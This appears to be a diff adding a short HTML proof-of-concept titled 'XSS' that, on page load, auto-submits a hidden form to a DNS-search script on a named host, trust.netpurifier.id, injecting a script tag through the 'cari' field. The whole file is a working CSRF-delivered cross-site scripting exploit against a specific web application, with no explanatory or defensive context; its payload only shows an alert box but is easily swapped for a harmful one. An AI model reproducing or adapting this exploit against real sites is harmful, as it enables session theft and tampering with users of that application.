@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>XSS</title>
+</head>
+<body onload="document.csrf.submit()">
+	<form action="https://trust.netpurifier.id:8010/dnsbse.php" method="POST" name="csrf">
+		<input type="text" name="cari" value="<script>alert('p00w')</script>">
+		<input name="server" value="www.google.co.id">
+		<input name="waktu" value="">
+		<input name="Submit" value="Search">
+	</form>
+</body>
+</html>
+
